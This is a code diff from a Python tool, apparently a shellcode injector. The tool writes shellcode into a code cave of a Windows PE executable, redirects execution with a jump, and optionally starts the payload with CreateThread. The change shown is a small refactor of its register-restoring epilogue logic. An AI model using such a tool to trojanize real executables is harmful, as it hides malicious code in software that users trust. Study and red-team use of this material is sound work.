@@ -220,6 +220,13 @@ def restore_registers_and_flags_64bit():
     return result
 
 
+def restore_registers_and_flags(pe: pefile.PE):
+    if is_64bit(pe):
+        return restore_registers_and_flags_64bit()
+    else:
+        return restore_registers_and_flags_32bit()
+
+
 def make_shellcode_prolog(is_64bit):
     prolog = b''
     prolog += save_registers_and_flags_64bit() if is_64bit else save_registers_and_flags_32bit()
@@ -242,7 +249,7 @@ def put_shellcode_to_cave(pe: pefile.PE, shellcode, cave: AddressRange, replaced
     prolog = make_shellcode_prolog(is_64bit(pe))
 
     epilog = b''
-    epilog += restore_registers_and_flags_64bit() if is_64bit(pe) else restore_registers_and_flags_32bit()
+    epilog += restore_registers_and_flags(pe)
     # restore instructions
     for i in replaced_instructions:
         epilog += i.bytes
@@ -281,8 +288,7 @@ def put_shellcode_to_cave_with_create_thread(pe: pefile.PE, shellcode, cave: Add
         cave.start.va, is_64bit=is_64bit(pe), current_inst_rva=current_inst_rva)
 
     epilog = b''
-    # 64bit CreateThread shellcode contains epilog already
-    epilog += restore_registers_and_flags_64bit() if is_64bit(pe) else restore_registers_and_flags_32bit()
+    epilog += restore_registers_and_flags(pe)
     # restore instructions
     for i in replaced_instructions:
         epilog += i.bytes
@@ -302,10 +308,11 @@ if __name__ == '__main__':
     # >setup
     args = Args()
     log_info(f'Parsing {args.source_pe()} and reading the shellcode')
-    with_create_thread = args.use_create_thread()
     pe = pefile.PE(args.source_pe(), fast_load=False)
+
     with open(args.shellcode_file(), 'rb') as f:
         shellcode = f.read()
+
     arch = 'amd64' if is_64bit(pe) else 'i386'
     context.update(arch=arch)
     # <setup
@@ -332,7 +339,8 @@ if __name__ == '__main__':
             f'Writing jmp instruction to {Address(pe, args.injection_address()).ava:X}')
     else:
         log_info('Writing jmp instruction to entry point')
-    if with_create_thread:
+
+    if args.use_create_thread():
         # we need to jump to our create_thread shellcode which is after the provided shellcode
         additional_offset = len(shellcode)
         replaced_instructions = put_jmp_to_text(
@@ -343,7 +351,7 @@ if __name__ == '__main__':
 
     print('')
     log_info('Writing the shellcode to code cave')
-    if with_create_thread:
+    if args.use_create_thread():
         put_shellcode_to_cave_with_create_thread(
             pe, shellcode, cave, replaced_instructions)
     else:
